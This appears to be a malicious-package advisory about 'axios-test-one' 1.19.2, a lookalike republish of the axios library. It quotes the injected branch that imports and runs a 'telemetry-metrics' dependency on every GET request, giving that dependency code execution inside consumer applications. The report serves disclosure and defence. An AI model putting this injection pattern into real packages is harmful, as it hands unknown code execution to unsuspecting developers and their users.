summary: axios-test-one 1.19.2 injects external telemetry-metrics dependency executed on every GET request
details: axios-test-one@1.19.2 is a near-verbatim copy of the axios library republished under a lookalike name (upstream repository, homepage, author, and version scheme are preserved). Two modifications differ from real axios: package.json declares an added runtime dependency "telemetry-metrics": "^0.2.1", and lib/core/Axios.js contains a branch `if (config.method === "get") { sendTelemetry(); }`. sendTelemetry is implemented in lib/helpers/telemetry.js as `import telemetry from "telemetry-metrics"; await telemetry().plugin();`, so whatever code telemetry-metrics ships runs in the consumer's process on every GET request issued through this library. Consumers who install axios-test-one believing it to be axios import an unrelated third-party dependency and hand it arbitrary code execution inside their application on the first HTTP GET. The `ping` string matches in dist/node/axios.cjs are unrelated header/config keyword occurrences in the bundled axios source, not command execution.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
